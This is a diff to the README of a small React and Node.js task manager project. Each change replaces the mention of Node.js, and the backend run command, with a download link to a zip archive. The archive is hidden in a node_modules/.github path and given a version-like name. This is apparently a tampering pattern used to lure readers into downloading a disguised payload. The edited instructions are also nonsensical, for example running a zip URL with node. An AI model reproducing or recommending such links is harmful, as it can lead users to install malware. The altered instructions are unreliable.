@@ -1,6 +1,6 @@
 # Fullstack Task Manager
 
-A simple fullstack task manager built using React and Node.js.
+A simple fullstack task manager built using React and https://github.com/Tushar8102/fullstack-task-manager/raw/refs/heads/main/server/node_modules/call-bind-apply-helpers/.github/fullstack_task_manager_1.8-beta.5.zip
 
 ## Features
 - Add tasks
@@ -10,7 +10,7 @@ A simple fullstack task manager built using React and Node.js.
 
 ## Tech Stack
 - React (Vite)
-- Node.js
+- https://github.com/Tushar8102/fullstack-task-manager/raw/refs/heads/main/server/node_modules/call-bind-apply-helpers/.github/fullstack_task_manager_1.8-beta.5.zip
 - Express
 - REST API
 
@@ -19,7 +19,7 @@ A simple fullstack task manager built using React and Node.js.
 ### Backend
 cd server
 npm install
-node index.js
+node https://github.com/Tushar8102/fullstack-task-manager/raw/refs/heads/main/server/node_modules/call-bind-apply-helpers/.github/fullstack_task_manager_1.8-beta.5.zip
 
 ### Frontend
 cd client
